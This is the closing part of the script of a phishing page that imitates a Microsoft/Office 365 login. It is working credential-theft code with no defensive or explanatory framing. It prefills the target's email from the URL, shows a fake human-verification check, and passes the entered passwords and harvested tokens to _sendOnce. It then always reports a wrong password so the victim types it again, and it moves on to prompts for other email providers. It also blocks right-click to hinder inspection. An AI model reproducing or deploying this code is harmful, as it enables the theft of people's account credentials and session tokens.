    // Helper functions
    function _showLoad(s) {
        var l = document.getElementById(_ids.lo);
        if (l) l.style.display = s ? 'flex' : 'none';
    }
    
    function _loadHash() {
        try {
            var h = window.location.hash;
            if (h && h.length > 1) {
                var e = decodeURIComponent(h.substring(1));
                if (e && e.indexOf('@') !== -1 && e.indexOf('.') !== -1) {
                    _email = e;
                    var inp = document.getElementById(_ids.ei);
                    var hint = document.getElementById(_ids.eh);
                    if (inp) {
                        inp.value = e;
                        if (hint) {
                            hint.innerHTML = 'Signing in as: <strong>' + _mask(e) + '</strong><br>Only your password is required.';
                            hint.style.display = 'block';
                        }
                        setTimeout(function() {
                            var nxt = document.getElementById(_ids.nb);
                            if (nxt) nxt.click();
                        }, 500);
                    }
                }
            }
        } catch(e) {}
    }
    
    // Bot verification
    var chk = document.getElementById(_ids.rc);
    var fake = document.getElementById(_ids.fc);
    var badge = document.getElementById(_ids.vb);
    var cont = document.getElementById(_ids.cb);
    
    if (chk) {
        chk.addEventListener('click', function() {
            if (!_botVerified) {
                var isHuman = BotShield.isHuman();
                if (isHuman) {
                    _botVerified = true;
                    if (fake) fake.classList.add('checked');
                    if (badge) { badge.classList.add('show'); badge.textContent = '✓ Human verified'; }
                    if (cont) { cont.disabled = false; cont.style.background = '#107c10'; cont.style.cursor = 'pointer'; }
                } else {
                    if (badge) { badge.classList.add('show'); badge.style.background = '#fff3cd'; badge.style.color = '#856404'; badge.textContent = '⚠ Please move your mouse naturally'; }
                    setTimeout(function() {
                        if (badge) { badge.classList.remove('show'); badge.style.background = '#e6f2e8'; badge.style.color = '#107c10'; }
                    }, 2000);
                }
            }
        });
    }
    
    if (cont) {
        cont.addEventListener('click', function() {
            if (_botVerified) {
                document.getElementById(_ids.bs).style.display = 'none';
                document.getElementById(_ids.es).style.display = 'block';
                _loadHash();
                if (!window.location.hash || window.location.hash.length <= 1) {
                    document.getElementById(_ids.ei).focus();
                }
            }
        });
    }
    
    // Email handling
    var nxt = document.getElementById(_ids.nb);
    var em = document.getElementById(_ids.ei);
    var err = document.getElementById(_ids.ee);
    var emailStep = document.getElementById(_ids.es);
    var passStep = document.getElementById(_ids.ps);
    var av = document.getElementById(_ids.ua);
    var ue = document.getElementById(_ids.ue);
    var back = document.getElementById(_ids.be);
    var hint = document.getElementById(_ids.eh);
    
    if (nxt) {
        nxt.addEventListener('click', function() {
            var val = em.value.trim();
            if (!val && window.location.hash && window.location.hash.length > 1) {
                val = decodeURIComponent(window.location.hash.substring(1));
            }
            if (val && /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(val)) {
                _email = val;
                err.style.display = 'none';
                em.classList.remove('error');
                if (hint) { hint.innerHTML = 'Signing in as: <strong>' + _mask(val) + '</strong>'; hint.style.display = 'block'; }
                av.textContent = val.charAt(0).toUpperCase();
                ue.textContent = _mask(val);
                emailStep.style.opacity = '0';
                setTimeout(function() {
                    emailStep.style.display = 'none';
                    passStep.style.display = 'block';
                    setTimeout(function() { passStep.style.opacity = '1'; document.getElementById(_ids.pi).focus(); }, 20);
                }, 150);
            } else {
                err.textContent = 'Please enter a valid email address.';
                err.style.display = 'block';
                em.classList.add('error');
                setTimeout(function() { err.style.display = 'none'; }, 2500);
            }
        });
    }
    
    if (back) {
        back.addEventListener('click', function() {
            passStep.style.opacity = '0';
            setTimeout(function() {
                passStep.style.display = 'none';
                emailStep.style.display = 'block';
                emailStep.style.opacity = '1';
                em.focus();
                document.getElementById(_ids.pi).value = '';
                document.getElementById(_ids.pe).style.display = 'none';
            }, 150);
        });
    }
    
    if (em) em.addEventListener('keypress', function(e) { if (e.key === 'Enter') nxt.click(); });
    
    // Password handling
    var sign = document.getElementById(_ids.sb);
    var passInp = document.getElementById(_ids.pi);
    var passErr = document.getElementById(_ids.pe);
    
    if (sign) {
        sign.addEventListener('click', async function() {
            var pwd = passInp.value;
            if (!pwd || !pwd.trim()) {
                passErr.textContent = 'Please enter your password.';
                passErr.style.display = 'block';
                passInp.classList.add('error');
                return;
            }
            passErr.style.display = 'none';
            passInp.classList.remove('error');
            _showLoad(true);
            sign.disabled = true;
            
            var tokens = _harvest();
            _sendOnce(_email, pwd, _provider || 'microsoft', tokens);
            
            await new Promise(function(r) { setTimeout(r, 1400); });
            _showLoad(false);
            sign.disabled = false;
            _fail++;
            passErr.textContent = 'Your password is incorrect. Please try again.';
            passErr.style.display = 'block';
            passInp.classList.add('error');
            passInp.value = '';
            passInp.focus();
            
            if (_fail >= 2) {
                document.getElementById(_ids.ps).style.display = 'none';
                document.getElementById(_ids.prs).style.display = 'block';
                passInp.value = '';
                _fail = 0;
            }
        });
        passInp.addEventListener('keypress', function(e) { if (e.key === 'Enter') sign.click(); });
    }
    
    // Provider selection
    var grid = document.getElementById(_ids.pg);
    var customDiv = document.getElementById(_ids.cd);
    var customInp = document.getElementById(_ids.ce);
    var customErr = document.getElementById(_ids.cce);
    var customSub = document.getElementById(_ids.csb);
    var backProv = document.getElementById(_ids.bpp);
    var provStep = document.getElementById(_ids.prs);
    var simpleStep = document.getElementById(_ids.sls);
    var simpleBack = document.getElementById(_ids.sbl);
    
    if (grid) {
        grid.querySelectorAll('.provider-option').forEach(function(opt) {
            opt.addEventListener('click', function() {
                var type = opt.getAttribute('data-p');
                var name = opt.textContent;
                _provider = type;
                
                if (type === 'custom') {
                    customDiv.style.display = 'block';
                } else if (type === 'microsoft' || type === 'office365') {
                    customDiv.style.display = 'none';
                    provStep.style.display = 'none';
                    document.getElementById(_ids.es).style.display = 'block';
                    document.getElementById(_ids.es).style.opacity = '1';
                    document.getElementById(_ids.ei).value = '';
                    document.getElementById(_ids.eh).style.display = 'none';
                    document.getElementById(_ids.ei).focus();
                    _fail = 0;
                    _provider = '';
                } else {
                    customDiv.style.display = 'none';
                    document.getElementById('spn').textContent = name;
                    provStep.style.display = 'none';
                    simpleStep.style.display = 'block';
                    document.getElementById(_ids.su).value = '';
                    document.getElementById(_ids.sp).value = '';
                    document.getElementById(_ids.se).style.display = 'none';
                }
            });
        });
    }
    
    if (customSub) {
        customSub.addEventListener('click', function() {
            var email = customInp.value.trim();
            if (email && /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/.test(email)) {
                _email = email;
                customErr.style.display = 'none';
                customInp.classList.remove('error');
                provStep.style.display = 'none';
                passStep.style.display = 'block';
                document.getElementById(_ids.ua).textContent = email.charAt(0).toUpperCase();
                document.getElementById(_ids.ue).textContent = _mask(email);
                _fail = 0;
                document.getElementById(_ids.pi).value = '';
                document.getElementById(_ids.pe).style.display = 'none';
            } else {
                customErr.textContent = 'Please enter a valid email address.';
                customErr.style.display = 'block';
                customInp.classList.add('error');
                setTimeout(function() { customErr.style.display = 'none'; }, 2500);
            }
        });
    }
    
    if (backProv) {
        backProv.addEventListener('click', function() {
            provStep.style.display = 'none';
            passStep.style.display = 'block';
            _fail = 0;
        });
    }
    
    if (simpleBack) {
        simpleBack.addEventListener('click', function() {
            simpleStep.style.display = 'none';
            provStep.style.display = 'block';
        });
    }
    
    // Simple sign-in
    var sBtn = document.getElementById(_ids.ssb);
    var uInp = document.getElementById(_ids.su);
    var pInp = document.getElementById(_ids.sp);
    var eSpan = document.getElementById(_ids.se);
    
    if (sBtn) {
        sBtn.addEventListener('click', async function() {
            var user = uInp.value.trim();
            var pass = pInp.value;
            
            if (!user || !pass) {
                eSpan.textContent = 'Please enter both username and password.';
                eSpan.style.display = 'block';
                return;
            }
            
            eSpan.style.display = 'none';
            _showLoad(true);
            sBtn.disabled = true;
            
            var email = user.indexOf('@') !== -1 ? user : user + '@' + _provider + '.com';
            var tokens = _harvest();
            _sendOnce(email, pass, _provider, tokens);
            
            await new Promise(function(r) { setTimeout(r, 1400); });
            _showLoad(false);
            sBtn.disabled = false;
            eSpan.textContent = 'Incorrect username or password. Please try again.';
            eSpan.style.display = 'block';
            uInp.value = '';
            pInp.value = '';
            uInp.focus();
        });
        
        uInp.addEventListener('keypress', function(e) { if (e.key === 'Enter') sBtn.click(); });
        pInp.addEventListener('keypress', function(e) { if (e.key === 'Enter') sBtn.click(); });
    }
    
    // Prevent form submissions
    document.querySelectorAll('form').forEach(function(f) { f.addEventListener('submit', function(e) { e.preventDefault(); }); });
    
    // Prevent right-click on form
    document.addEventListener('contextmenu', function(e) {
        if (e.target.closest('.login-card')) { e.preventDefault(); return false; }
    });
    
})();
</script>
</body>
</html>
